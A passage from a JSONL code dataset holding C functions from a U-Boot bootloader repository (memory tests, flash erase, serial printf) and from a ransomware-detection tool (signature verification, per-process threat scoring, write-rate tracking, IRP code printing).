0xffffffff;\n\t\tlo = pattern[i] & 0xffffffff;\n\t\t/* printf(\"\\npattern[%d] = 0x%08x%08x\", i, hi, lo);  */\n\n\t\tif (temp64 != pattern[i]) {\n\t\t\tprintf (\"\\n   Data Test Failed, pattern 0x%08x%08x\",\n\t\t\t\thi, lo);\n\t\t\treturn 1;\n\t\t}\n\t}\n\n\treturn 0;\n}", "path": "u-boot-2011.09\\board\\gw8260\\gw8260.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/*-----------------------------------------------------------------------\n */\n", "func_signal": "int lpc2292_flash_erase (flash_info_t * info, int s_first, int s_last)", "code": "{\n\tint flag;\n\tint prot;\n\tint sect;\n\n\tprot = 0;\n\tfor (sect = s_first; sect <= s_last; ++sect) {\n\t\tif (info->protect[sect]) {\n\t\t\tprot++;\n\t\t}\n\t}\n\tif (prot)\n\t\treturn ERR_PROTECTED;\n\n\n\tflag = disable_interrupts();\n\n\tprintf (\"Erasing %d sectors starting at sector %2d.\\n\"\n\t\"This make take some time ... \",\n\ts_last - s_first + 1, s_first);\n\n\tcommand[0] = IAP_CMD_PREPARE;\n\tcommand[1] = s_first;\n\tcommand[2] = s_last;\n\tiap_entry(command, result);\n\tif (result[0] != IAP_RET_CMD_SUCCESS) {\n\t\tprintf(\"IAP prepare failed\\n\");\n\t\treturn ERR_PROTECTED;\n\t}\n\n\tcommand[0] = IAP_CMD_ERASE;\n\tcommand[1] = s_first;\n\tcommand[2] = s_last;\n\tcommand[3] = CONFIG_SYS_SYS_CLK_FREQ >> 10;\n\tiap_entry(command, result);\n\tif (result[0] != IAP_RET_CMD_SUCCESS) {\n\t\tprintf(\"IAP erase failed\\n\");\n\t\treturn ERR_PROTECTED;\n\t}\n\n\tif (flag)\n\t\tenable_interrupts();\n\n\treturn ERR_OK;\n}", "path": "u-boot-2011.09\\arch\\arm\\cpu\\arm720t\\lpc2292\\flash.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/*\n************************************************************************************************************\n*\n*                                             function\n*\n*    \u01a3\n*\n*    \u0431\n*\n*    \u05b5  \n*\n*    \u02f5    \n*\n*\n************************************************************************************************************\n*/\n", "func_signal": "void standby_printf( const char * str, ...)", "code": "{\n\tchar string[16];\n\tchar *p;\n\tva_list argp;\n\n\tva_start( argp, str );\n\n\twhile( *str )\n\t{\n\t\tif( *str == '%' )\n\t\t{\n\t\t\t++str;\n\t\t\tp = string;\n\t\t\tswitch( *str )\n\t\t\t{\n\t\t\t\tcase 'd': standby_int_to_string_dec( va_arg( argp,  __s32 ), string );\n                          standby_serial_puts( p );\n\t\t\t\t\t\t  ++str;\n\t\t\t\t\t\t  break;\n\t\t\t\tcase 'x':\n\t\t\t\tcase 'X': standby_int_to_string_hex( va_arg( argp,  __s32 ), string );\n\t\t\t\t\t\t  standby_serial_puts( p );\n                          ++str;\n\t\t\t\t\t\t  break;\n\t\t\t\tcase 'c': standby_serial_putc( va_arg( argp,  __s32 ) );\n\t\t\t\t\t\t  ++str;\n\t\t\t\t\t\t  break;\n\t\t\t\tcase 's': standby_serial_puts( va_arg( argp, char * ) );\n\t\t\t\t\t\t  ++str;\n\t\t\t\t\t\t  break;\n\t\t\t\tdefault : standby_serial_putc( '%' );       // if current character is not Conversion Specifiers 'dxpXucs',\n\t\t\t\t\t\t  standby_serial_putc( *str );      // output directly '%' and current character, and then\n\t\t\t\t\t\t  ++str;                                         // let 'str' point to next character.\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tif( *str == '\\n' )                      // if current character is '\\n', insert and output '\\r'\n\t\t\t\tstandby_serial_putc( '\\r' );\n\n\t\t\tstandby_serial_putc( *str++ );\n\t\t}\n\t}\n\n\tva_end( argp );\n\n\treturn;\n}", "path": "u-boot-2011.09\\board\\sunxi\\sun8iw7\\standby\\standby_serial.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "/*\t\t\t\t\t\t\t\t     */\n/* INPUTS:\t\t\t\t\t\t\t     */\n/*   volatile unsigned long long * base - start address of test\t     */\n/*   unsigned int size - number of dwords(64-bit) to test\t     */\n/*   unsigned long long rmask - read verify mask\t\t     */\n/*   unsigned long long wmask - wrtie verify mask\t\t     */\n/*   short read - verifies rmask if read = 1\t\t\t     */\n/*   short write  - writes wmask if write = 1\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/* OUTPUTS:\t\t\t\t\t\t\t     */\n/*   Displays failing test pattern and address\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/* RETURNS:\t\t\t\t\t\t\t     */\n/*   0 -  Passed test\t\t\t\t\t\t     */\n/*   1 -  Failed test\t\t\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/* RESTRICTIONS/LIMITATIONS:\t\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/*\t\t\t\t\t\t\t\t     */\n/*********************************************************************/\n", "func_signal": "int mem_march (volatile unsigned long long *base,\n\t       unsigned int size,\n\t       unsigned long long rmask,\n\t       unsigned long long wmask, short read, short write)", "code": "{\n\tunsigned int i;\n\tunsigned long long temp = 0;\n\tunsigned int hitemp, lotemp, himask, lomask;\n\n\tfor (i = 0; i < size; i++) {\n\t\tif (read != 0) {\n\t\t\t/* temp = base[i]; */\n\t\t\tmove64 ((unsigned long long *) &(base[i]), &temp);\n\t\t\tif (rmask != temp) {\n\t\t\t\thitemp = (temp >> 32) & 0xffffffff;\n\t\t\t\tlotemp = temp & 0xffffffff;\n\t\t\t\thimask = (rmask >> 32) & 0xffffffff;\n\t\t\t\tlomask = rmask & 0xffffffff;\n\n\t\t\t\tprintf (\"\\n Walking one's test failed: address = 0x%08x,\" \"\\n\\texpected 0x%08x%08x, found 0x%08x%08x\", i << 3, himask, lomask, hitemp, lotemp);\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t\tif (write != 0) {\n\t\t\t/*  base[i] = wmask; */\n\t\t\tmove64 (&wmask, (unsigned long long *) &(base[i]));\n\t\t}\n\t}\n\treturn 0;\n}", "path": "u-boot-2011.09\\board\\gw8260\\gw8260.c", "repo_name": "allwinner-zh/bootloader", "stars": 110, "license": "None", "language": "c", "size": 16746}
{"docstring": "//\n// VerifyPESignature\n// Verifies the digital signature of a file\n//\n", "func_signal": "BOOL VerifyPESignature(LPCWSTR pwszSourceFile)", "code": "{\n\tLONG lStatus;\n\tDWORD dwLastError;\n\tBOOL verified = FALSE;\n\tTCHAR minispyPath[MAX_PATH];\n\n\t// Initialize the WINTRUST_FILE_INFO structure.\n\n\tWINTRUST_FILE_INFO FileData;\n\tmemset(&FileData, 0, sizeof(FileData));\n\tFileData.cbStruct = sizeof(WINTRUST_FILE_INFO);\n\tFileData.pcwszFilePath = pwszSourceFile;\n\tFileData.hFile = NULL;\n\tFileData.pgKnownSubject = NULL;\n\n\t/*\n\tWVTPolicyGUID specifies the policy to apply on the file\n\tWINTRUST_ACTION_GENERIC_VERIFY_V2 policy checks:\n\n\t1) The certificate used to sign the file chains up to a root\n\tcertificate located in the trusted root certificate store. This\n\timplies that the identity of the publisher has been verified by\n\ta certification authority.\n\n\t2) In cases where user interface is displayed (which this example\n\tdoes not do), WinVerifyTrust will check for whether the\n\tend entity certificate is stored in the trusted publisher store,\n\timplying that the user trusts content from this publisher.\n\n\t3) The end entity certificate has sufficient permission to sign\n\tcode, as indicated by the presence of a code signing EKU or no\n\tEKU.\n\t*/\n\n\tGUID WVTPolicyGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;\n\tWINTRUST_DATA WinTrustData;\n\n\t// Initialize the WinVerifyTrust input data structure.\n\n\t// Default all fields to 0.\n\tmemset(&WinTrustData, 0, sizeof(WinTrustData));\n\n\tWinTrustData.cbStruct = sizeof(WinTrustData);\n\n\t// Use default code signing EKU.\n\tWinTrustData.pPolicyCallbackData = NULL;\n\n\t// No data to pass to SIP.\n\tWinTrustData.pSIPClientData = NULL;\n\n\t// Disable WVT UI.\n\tWinTrustData.dwUIChoice = WTD_UI_NONE;\n\n\t// No revocation checking.\n\tWinTrustData.fdwRevocationChecks = WTD_REVOKE_NONE;\n\n\t// Verify an embedded signature on a file.\n\tWinTrustData.dwUnionChoice = WTD_CHOICE_FILE;\n\n\t// Verify action.\n\tWinTrustData.dwStateAction = WTD_STATEACTION_VERIFY;\n\n\t// Verification sets this value.\n\tWinTrustData.hWVTStateData = NULL;\n\n\t// Not used.\n\tWinTrustData.pwszURLReference = NULL;\n\n\t// This is not applicable if there is no UI because it changes \n\t// the UI to accommodate running applications instead of \n\t// installing applications.\n\tWinTrustData.dwUIContext = 0;\n\n\t// Set pFile.\n\tWinTrustData.pFile = &FileData;\n\n\t// WinVerifyTrust verifies signatures as specified by the GUID \n\t// and Wintrust_Data.\n\tlStatus = WinVerifyTrust(\n\t\tNULL,\n\t\t&WVTPolicyGUID,\n\t\t&WinTrustData);\n\n\t// Returning true if Minispy\n\tGetFileNameFromPID(GetCurrentProcessId(), &minispyPath);\n\tif (!(wcscmp(minispyPath, pwszSourceFile))) {\n\t\treturn TRUE;\n\t}\n\n\tswitch (lStatus)\n\t{\n\tcase ERROR_SUCCESS:\n\t\t/*\n\t\tSigned file:\n\t\t- Hash that represents the subject is trusted.\n\n\t\t- Trusted publisher without any verification errors.\n\n\t\t- UI was disabled in dwUIChoice. No publisher or\n\t\ttime stamp chain errors.\n\n\t\t- UI was enabled in dwUIChoice and the user clicked\n\t\t\"Yes\" when asked to install and run the signed\n\t\tsubject.\n\t\t*/\n\t\tif (IsVerbose || IsVeryVerbose)\n\t\t\twprintf_s(L\"The file \\\"%s\\\" is signed and the signature \"\n\t\t\t\tL\"was verified.\\n\",\n\t\t\t\tpwszSourceFile);\n\t\tverified = TRUE;\n\t\tbreak;\n\n\tcase TRUST_E_NOSIGNATURE:\n\t\t// The file was not signed or had a signature \n\t\t// that was not valid.\n\n\t\t// Get the reason for no signature.\n\t\tdwLastError = GetLastError();\n\t\tif (TRUST_E_NOSIGNATURE == dwLastError ||\n\t\t\tTRUST_E_SUBJECT_FORM_UNKNOWN == dwLastError ||\n\t\t\tTRUST_E_PROVIDER_UNKNOWN == dwLastError)\n\t\t{\n\t\t\t// The file was not signed.\n\t\t\tif (IsVerbose || IsVeryVerbose)\n\t\t\t\twprintf_s(L\"The file \\\"%s\\\" is not signed.\\n\",\n\t\t\t\t\tpwszSourceFile);\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// The signature was not valid or there was an error \n\t\t\t// opening the file.\n\t\t\tif (IsVerbose || IsVeryVerbose)\n\t\t\t\twprintf_s(L\"An unknown error occurred trying to \"\n\t\t\t\t\tL\"verify the signature of the \\\"%s\\\" file.\\n\",\n\t\t\t\t\tpwszSourceFile);\n\t\t}\n\n\t\tbreak;\n\n\tcase TRUST_E_EXPLICIT_DISTRUST:\n\t\t// The hash that represents the subject or the publisher \n\t\t// is not allowed by the admin or user.\n\t\tif (IsVerbose || IsVeryVerbose)\n\t\t\twprintf_s(L\"The signature is present, but specifically \"\n\t\t\t\tL\"disallowed.\\n\");\n\t\tbreak;\n\n\tcase TRUST_E_SUBJECT_NOT_TRUSTED:\n\t\t// The user clicked \"No\" when asked to install and run.\n\t\tif (IsVerbose || IsVeryVerbose)\n\t\t\twprintf_s(L\"The signature is present, but not \"\n\t\t\t\tL\"trusted.\\n\");\n\t\tbreak;\n\n\tcase CRYPT_E_SECURITY_SETTINGS:\n\t\t/*\n\t\tThe hash that represents the subject or the publisher\n\t\twas not explicitly trusted by the admin and the\n\t\tadmin policy has disabled user trust. No signature,\n\t\tpublisher or time stamp errors.\n\t\t*/\n\t\tif (IsVerbose || IsVeryVerbose)\n\t\t\twprintf_s(L\"CRYPT_E_SECURITY_SETTINGS - The hash \"\n\t\t\t\tL\"representing the subject or the publisher wasn't \"\n\t\t\t\tL\"explicitly trusted by the admin and admin policy \"\n\t\t\t\tL\"has disabled user trust. No signature, publisher \"\n\t\t\t\tL\"or timestamp errors.\\n\");\n\t\tbreak;\n\tcase TRUST_E_SELF_SIGNED_SIGNATURE:\n\t\tif (IsVerbose || IsVeryVerbose)\n\t\t\twprintf_s(L\"The file \\\"%s\\\" is self signed.\\n\",\n\t\t\t\tpwszSourceFile);\n\t\tbreak;\n\tdefault:\n\t\t// The UI was disabled in dwUIChoice or the admin policy \n\t\t// has disabled user trust. lStatus contains the \n\t\t// publisher or time stamp chain error.\n\t\tif (IsVerbose || IsVeryVerbose)\n\t\t\twprintf_s(L\"File \\\"%s\\\" produced error: 0x%x.\\n\",\n\t\t\t\tpwszSourceFile,\n\t\t\t\tlStatus);\n\t\tbreak;\n\t}\n\n\t// Any hWVTStateData must be released by a call with close.\n\tWinTrustData.dwStateAction = WTD_STATEACTION_CLOSE;\n\n\tlStatus = WinVerifyTrust(\n\t\tNULL,\n\t\t&WVTPolicyGUID,\n\t\t&WinTrustData);\n\n\t// Overrides signature detection for DLLHOST.exe to avoid false positives\n\t// if signature detection fails\n\tif (wcsicmp(pwszSourceFile, L\"C:\\\\Windows\\\\System32\\\\dllhost.exe\") == 0 || wcsicmp(pwszSourceFile, L\"C:\\\\Windows\\\\SysWOW64\\\\dllhost.exe\") == 0) {\n\t\tverified = TRUE;\n\t}\n\n\treturn verified;\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "// \n// IncreaseThreatLevel\n// Increments a processes threat level\n// @variable ProcessMap - UTHashMap that contains processes\n// @variable ProcessID - Process ID\n// @variable ThreatIncrease - Amount of threat to increase the threatlevel by\n//\n", "func_signal": "int IncreaseThreatLevel(struct ProcessThreatLevel ** ProcessMap, FILE_ID ProcessId, int ThreatIncrease)", "code": "{\n\tstruct ProcessThreatLevel * tPointer;\n\t//find the process\n\tHASH_FIND_INT(*ProcessMap, &ProcessId, tPointer);\n\n\t//use the pointer to change the value of the Threat\n\ttPointer->dwThreatLevel = tPointer->dwThreatLevel + ThreatIncrease;\n\n\t//return the threatlevel for threshold checking\n\treturn tPointer->dwThreatLevel;\n\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "// Insert a new element of type struct PidChangeTracker, and expands the array size when it is full\n", "func_signal": "void InsertElement(Array *a, struct PidChangeTracker *pTracker)", "code": "{\n\tif (a->used == a->size) {\n\t\ta->size *= 2;\n\t\ta->array = (struct PidChangeTracker *)realloc(a->array, a->size * sizeof(struct PidChangeTracker));\n\t\tif (a->array == NULL) {\n\t\t\tfprintf(stderr, \"Failed to expand size of array.\");\n\t\t\texit(EXIT_FAILURE);\n\t\t}\n\t}\n\ta->array[a->used++] = *pTracker;\n}", "path": "user\\array.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "// \n// UntrackHeuristic\n// Removes a heuristic from a HeuristicMap\n// @variable HeuristicMap - UTHashmap that contains heuristics\n// @variable wHeuristicPath - heuristic path\n//\n", "func_signal": "int UntrackHeuristic(struct HeuristicSignature ** HeuristicMap, WCHAR CONST * wHeuristicPath)", "code": "{\n\tstruct HeuristicSignature * tmpHeuristic = NULL;\n\n\t// Find Process\n\t__pragma(warning(push))\n\t\t__pragma(warning(disable:4047))\n\t\t__pragma(warning(disable:4024))\n\t\tHASH_FIND_STR(*HeuristicMap, &wHeuristicPath, tmpHeuristic);\n\t__pragma(warning(pop))\n\t\tif (tmpHeuristic != NULL)\n\t\t{\n\t\t\t// Remove process from map and free data\n\t\t\tHASH_DEL(*HeuristicMap, tmpHeuristic);\n\t\t\tfree(tmpHeuristic);\n\t\t\treturn SUCCESS;\n\t\t}\n\n\t// Return failure if process not found in map\n\treturn FAILURE;\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "// Check the status of the current queue specfied and remove all timestamp \n// entries for the specfic PID, that are over a minute old\n", "func_signal": "void CleanUpQueue(struct PidChangeTracker *pTracker)", "code": "{\n\n\tint i;\n\ttime_t now;\n\tstruct tm *t;\n\n\t// Checks to see if the timestamp at front of the queue is older\n\t// then a minute, and if not the loops breaks since the most recent\n\t// timestamps are at the back of the queue\n\ttime(&now);\n\tif (pTracker->size > 0) {\n\t\tfor (i = 0; i < pTracker->size; i++) {\n\t\t\tt = (struct tm*)utarray_front(pTracker->queue);\n\t\t\tif (difftime(now, mktime(t)) >= 30) {\n\t\t\t\tutarray_erase(pTracker->queue, 0, 1);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\t// Updates the size of the queue and the amount of checks\n\t// made against the queue\n\tpTracker->size = utarray_len(pTracker->queue);\n\n\t// Calculating the average writes per second for a particular PID\n\t// If checks are zero, we set the writes per second to the size of pTracker\n\t// to avoid division by 0\n\tif (pTracker->checks == 0) {\n\t\tpTracker->writesPerSec = (float)pTracker->size;\n\t}\n\telse {\n\t\tif (pTracker->checks < 30) {\n\t\t\tpTracker->writesPerSec = (float)pTracker->size / (float)pTracker->checks;\n\t\t}\n\t\telse {\n\t\t\tpTracker->writesPerSec = (float)pTracker->size / 30.0f;\n\t\t}\n\t}\n\n\tpTracker->checks++;\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "// \n// TrackHeuristic\n// Adds a heuristic path to the passed HeuristicMap\n// @variable HeuristicMap - UTHashmap that contains heuristics\n// @variable wHeuristicPath - heuristic path\n// @variable dwThreatLevel - Amount of threat associated with path\n//\n", "func_signal": "int TrackHeuristic(struct HeuristicSignature ** HeuristicMap, WCHAR CONST * wHeuristicPath, DWORD dwThreatLevel)", "code": "{\n\tstruct HeuristicSignature * tmpHeuristic = NULL;\n\n\t// Determines if hash is already in map\n\t__pragma(warning(push))\n\t\t__pragma(warning(disable:4047))\n\t\t__pragma(warning(disable:4024))\n\t\tHASH_FIND_STR(*HeuristicMap, &wHeuristicPath, tmpHeuristic);\n\t__pragma(warning(pop))\n\t\tif (tmpHeuristic == NULL)\n\t\t{\n\t\t\t// Will add if not found\n\t\t\ttmpHeuristic = malloc(sizeof(struct HeuristicSignature));\n\t\t\ttmpHeuristic->wHeuristicPath = wHeuristicPath;\n\t\t\ttmpHeuristic->dwThreatLevel = dwThreatLevel;\n\t\t\n\t\t\tHASH_ADD_STR(*HeuristicMap, wHeuristicPath, tmpHeuristic);\n\t\t\treturn SUCCESS;\n\t\t}\n\n\t// Return failure if process already in map\n\treturn FAILURE;\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "//\n// Enables Debug Privileges\n//\t\tBy enableing the SE_DEBUG_FUNCTION privilege we can use the OpenProcess function and obtain\n//\t\ta handle for any process alive on the system (excluding porcessess 0 and 4)\n//\n", "func_signal": "int EnableDebugPrivileges()", "code": "{\n\t// \n\tHANDLE hProcToken = 0;\n\t// Token privileges structure\n\tTOKEN_PRIVILEGES tkpPriv = { 0 };\n\n\tif (!OpenProcessToken(GetCurrentProcess(),\n\t\tTOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,\n\t\t&hProcToken))\n\t{\n\t\treturn 1;\n\t}\n\n\tLookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkpPriv.Privileges[0].Luid);\n\n\t// Count of privilege\n\ttkpPriv.PrivilegeCount = 1;\n\n\t// Set up \"enable\" attribute for privilege\n\ttkpPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n\t// Set up privilege\n\tAdjustTokenPrivileges(hProcToken, FALSE, &tkpPriv, 0, 0, 0);\n\n\tCloseHandle(hProcToken);\n\n\treturn 0;\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "/*++\n\nRoutine Description:\n\nDisplay the operation code\n\nArguments:\n\nMajorCode - Major function code of operation\n\nMinorCode - Minor function code of operation\n\nOutputFile - If writing to a file (not the screen) the handle for that file\n\nPrintMajorCode - Only used when printing to the display:\nTRUE - if we want to display the MAJOR CODE\nFALSE - if we want to display the MINOR code\n\nReturn Value:\n\nNone\n\n--*/\n", "func_signal": "VOID PrintIrpCode(_In_ UCHAR MajorCode, _In_ UCHAR MinorCode, _In_opt_ FILE *OutputFile, _In_ BOOLEAN PrintMajorCode)", "code": "{\n\tCHAR *irpMajorString, *irpMinorString = NULL;\n\tCHAR errorBuf[128];\n\n\tswitch (MajorCode) {\n\tcase IRP_MJ_CREATE:\n\t\tirpMajorString = IRP_MJ_CREATE_STRING;\n\t\tbreak;\n\tcase IRP_MJ_CREATE_NAMED_PIPE:\n\t\tirpMajorString = IRP_MJ_CREATE_NAMED_PIPE_STRING;\n\t\tbreak;\n\tcase IRP_MJ_CLOSE:\n\t\tirpMajorString = IRP_MJ_CLOSE_STRING;\n\t\tbreak;\n\tcase IRP_MJ_READ:\n\t\tirpMajorString = IRP_MJ_READ_STRING;\n\t\tswitch (MinorCode) {\n\t\tcase IRP_MN_NORMAL:\n\t\t\tirpMinorString = IRP_MN_NORMAL_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_DPC:\n\t\t\tirpMinorString = IRP_MN_DPC_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_MDL:\n\t\t\tirpMinorString = IRP_MN_MDL_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_COMPLETE:\n\t\t\tirpMinorString = IRP_MN_COMPLETE_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_COMPRESSED:\n\t\t\tirpMinorString = IRP_MN_COMPRESSED_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_MDL_DPC:\n\t\t\tirpMinorString = IRP_MN_MDL_DPC_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_COMPLETE_MDL:\n\t\t\tirpMinorString = IRP_MN_COMPLETE_MDL_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_COMPLETE_MDL_DPC:\n\t\t\tirpMinorString = IRP_MN_COMPLETE_MDL_DPC_STRING;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tsprintf_s(errorBuf, sizeof(errorBuf), \"Unknown Irp minor code (%u)\", MinorCode);\n\t\t\tirpMinorString = errorBuf;\n\t\t}\n\t\tbreak;\n\n\tcase IRP_MJ_WRITE:\n\t\tirpMajorString = IRP_MJ_WRITE_STRING;\n\t\tswitch (MinorCode) {\n\t\tcase IRP_MN_NORMAL:\n\t\t\tirpMinorString = IRP_MN_NORMAL_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_DPC:\n\t\t\tirpMinorString = IRP_MN_DPC_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_MDL:\n\t\t\tirpMinorString = IRP_MN_MDL_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_COMPLETE:\n\t\t\tirpMinorString = IRP_MN_COMPLETE_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_COMPRESSED:\n\t\t\tirpMinorString = IRP_MN_COMPRESSED_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_MDL_DPC:\n\t\t\tirpMinorString = IRP_MN_MDL_DPC_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_COMPLETE_MDL:\n\t\t\tirpMinorString = IRP_MN_COMPLETE_MDL_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_COMPLETE_MDL_DPC:\n\t\t\tirpMinorString = IRP_MN_COMPLETE_MDL_DPC_STRING;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tsprintf_s(errorBuf, sizeof(errorBuf), \"Unknown Irp minor code (%u)\", MinorCode);\n\t\t\tirpMinorString = errorBuf;\n\t\t}\n\t\tbreak;\n\n\tcase IRP_MJ_QUERY_INFORMATION:\n\t\tirpMajorString = IRP_MJ_QUERY_INFORMATION_STRING;\n\t\tbreak;\n\tcase IRP_MJ_SET_INFORMATION:\n\t\tirpMajorString = IRP_MJ_SET_INFORMATION_STRING;\n\t\tbreak;\n\tcase IRP_MJ_QUERY_EA:\n\t\tirpMajorString = IRP_MJ_QUERY_EA_STRING;\n\t\tbreak;\n\tcase IRP_MJ_SET_EA:\n\t\tirpMajorString = IRP_MJ_SET_EA_STRING;\n\t\tbreak;\n\tcase IRP_MJ_FLUSH_BUFFERS:\n\t\tirpMajorString = IRP_MJ_FLUSH_BUFFERS_STRING;\n\t\tbreak;\n\tcase IRP_MJ_QUERY_VOLUME_INFORMATION:\n\t\tirpMajorString = IRP_MJ_QUERY_VOLUME_INFORMATION_STRING;\n\t\tbreak;\n\tcase IRP_MJ_SET_VOLUME_INFORMATION:\n\t\tirpMajorString = IRP_MJ_SET_VOLUME_INFORMATION_STRING;\n\t\tbreak;\n\tcase IRP_MJ_DIRECTORY_CONTROL:\n\t\tirpMajorString = IRP_MJ_DIRECTORY_CONTROL_STRING;\n\t\tswitch (MinorCode) {\n\t\tcase IRP_MN_QUERY_DIRECTORY:\n\t\t\tirpMinorString = IRP_MN_QUERY_DIRECTORY_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_NOTIFY_CHANGE_DIRECTORY:\n\t\t\tirpMinorString = IRP_MN_NOTIFY_CHANGE_DIRECTORY_STRING;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tsprintf_s(errorBuf, sizeof(errorBuf), \"Unknown Irp minor code (%u)\", MinorCode);\n\t\t\tirpMinorString = errorBuf;\n\t\t}\n\t\tbreak;\n\n\tcase IRP_MJ_FILE_SYSTEM_CONTROL:\n\t\tirpMajorString = IRP_MJ_FILE_SYSTEM_CONTROL_STRING;\n\t\tswitch (MinorCode) {\n\t\tcase IRP_MN_USER_FS_REQUEST:\n\t\t\tirpMinorString = IRP_MN_USER_FS_REQUEST_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_MOUNT_VOLUME:\n\t\t\tirpMinorString = IRP_MN_MOUNT_VOLUME_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_VERIFY_VOLUME:\n\t\t\tirpMinorString = IRP_MN_VERIFY_VOLUME_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_LOAD_FILE_SYSTEM:\n\t\t\tirpMinorString = IRP_MN_LOAD_FILE_SYSTEM_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_TRACK_LINK:\n\t\t\tirpMinorString = IRP_MN_TRACK_LINK_STRING;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tsprintf_s(errorBuf, sizeof(errorBuf), \"Unknown Irp minor code (%u)\", MinorCode);\n\t\t\tirpMinorString = errorBuf;\n\t\t}\n\t\tbreak;\n\n\tcase IRP_MJ_DEVICE_CONTROL:\n\t\tirpMajorString = IRP_MJ_DEVICE_CONTROL_STRING;\n\t\tswitch (MinorCode) {\n\t\tcase IRP_MN_SCSI_CLASS:\n\t\t\tirpMinorString = IRP_MN_SCSI_CLASS_STRING;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tsprintf_s(errorBuf, sizeof(errorBuf), \"Unknown Irp minor code (%u)\", MinorCode);\n\t\t\tirpMinorString = errorBuf;\n\t\t}\n\t\tbreak;\n\n\tcase IRP_MJ_INTERNAL_DEVICE_CONTROL:\n\t\tirpMajorString = IRP_MJ_INTERNAL_DEVICE_CONTROL_STRING;\n\t\tbreak;\n\tcase IRP_MJ_SHUTDOWN:\n\t\tirpMajorString = IRP_MJ_SHUTDOWN_STRING;\n\t\tbreak;\n\tcase IRP_MJ_LOCK_CONTROL:\n\t\tirpMajorString = IRP_MJ_LOCK_CONTROL_STRING;\n\t\tswitch (MinorCode) {\n\t\tcase IRP_MN_LOCK:\n\t\t\tirpMinorString = IRP_MN_LOCK_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_UNLOCK_SINGLE:\n\t\t\tirpMinorString = IRP_MN_UNLOCK_SINGLE_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_UNLOCK_ALL:\n\t\t\tirpMinorString = IRP_MN_UNLOCK_ALL_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_UNLOCK_ALL_BY_KEY:\n\t\t\tirpMinorString = IRP_MN_UNLOCK_ALL_BY_KEY_STRING;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tsprintf_s(errorBuf, sizeof(errorBuf), \"Unknown Irp minor code (%u)\", MinorCode);\n\t\t\tirpMinorString = errorBuf;\n\t\t}\n\t\tbreak;\n\n\tcase IRP_MJ_CLEANUP:\n\t\tirpMajorString = IRP_MJ_CLEANUP_STRING;\n\t\tbreak;\n\tcase IRP_MJ_CREATE_MAILSLOT:\n\t\tirpMajorString = IRP_MJ_CREATE_MAILSLOT_STRING;\n\t\tbreak;\n\tcase IRP_MJ_QUERY_SECURITY:\n\t\tirpMajorString = IRP_MJ_QUERY_SECURITY_STRING;\n\t\tbreak;\n\tcase IRP_MJ_SET_SECURITY:\n\t\tirpMajorString = IRP_MJ_SET_SECURITY_STRING;\n\t\tbreak;\n\tcase IRP_MJ_POWER:\n\t\tirpMajorString = IRP_MJ_POWER_STRING;\n\t\tswitch (MinorCode) {\n\t\tcase IRP_MN_WAIT_WAKE:\n\t\t\tirpMinorString = IRP_MN_WAIT_WAKE_STRING;\n\t\t\tbreak;\n\t\tcase IRP_MN_POWER_SEQUENCE:\n\t\t\tirpMinorString = 